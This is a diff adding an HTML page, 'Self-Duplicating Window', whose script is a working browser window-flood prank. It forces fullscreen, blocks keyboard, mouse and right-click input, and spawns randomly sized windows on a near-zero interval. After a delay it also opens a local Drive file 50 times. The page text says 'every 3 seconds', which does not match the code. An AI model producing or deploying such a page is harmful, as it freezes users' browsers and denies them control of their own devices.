@@ -1,0 +1,76 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Self-Duplicating Window</title>
+
+    <script>
+        document.documentElement.requestFullscreen();
+
+        let isRoot = window.opener == null; // Check if this is the original allowed window
+
+        function getRandomColor() {
+            return `rgb(${Math.floor(Math.random() * 256)}, ${Math.floor(Math.random() * 256)}, ${Math.floor(Math.random() * 256)})`;
+        }
+
+        function getRandomSize() {
+            let width = Math.floor(Math.random() * (800 - 200 + 1)) + 200;
+            let height = Math.floor(Math.random() * (800 - 200 + 1)) + 200;
+            return { width, height };
+        }
+
+        function openWin() {
+            if (isRoot) {
+                let { width, height } = getRandomSize();
+                const newWin = window.open(location.href, "_blank", `width=${width},height=${height}`);
+                if (newWin) {
+                    newWin.document.body.style.backgroundColor = getRandomColor();
+                    newWin.isChild = true; // Mark child windows
+                }
+            } else {
+                // If it's a child window, tell the root to open more
+                if (window.opener) {
+                    window.opener.requestNewWindow();
+                }
+            }
+        }
+
+        function requestNewWindow() {
+            openWin();
+        }
+
+        function disableInputs() {
+            document.addEventListener('keydown', function(e) {
+                e.preventDefault();
+            });
+            document.addEventListener('mousedown', function(e) {
+                e.preventDefault();
+            });
+            document.addEventListener('contextmenu', function(e) {
+                e.preventDefault();
+            });
+        }
+
+        window.onload = function() {
+            document.body.style.backgroundColor = getRandomColor();
+            setInterval(openWin, .0001); // Set interval to 0.0001 milliseconds (effectively instantaneous)
+            disableInputs();
+
+            // Wait 10 seconds before starting the loop to open the specific file URL
+            setTimeout(() => {
+                for (let i = 0; i < 50; i++) {
+                    setTimeout(() => {
+                        window.open("file:///media/fuse/drivefs-a1dbf600d76b2c7c2b289cfb07ded0b5/root/HTml/peirs%20morgan.html");
+                    }, i * 10000); // Open each window with a 10-second delay
+                }
+            }, 10000); // Initial 10-second delay
+        };
+    </script>
+
+</head>
+<body>
+    <h1>Self-Duplicating Window</h1>
+    <p>This window will keep duplicating itself and open new windows continuously every 3 seconds!</p>
+</body>
+</html>
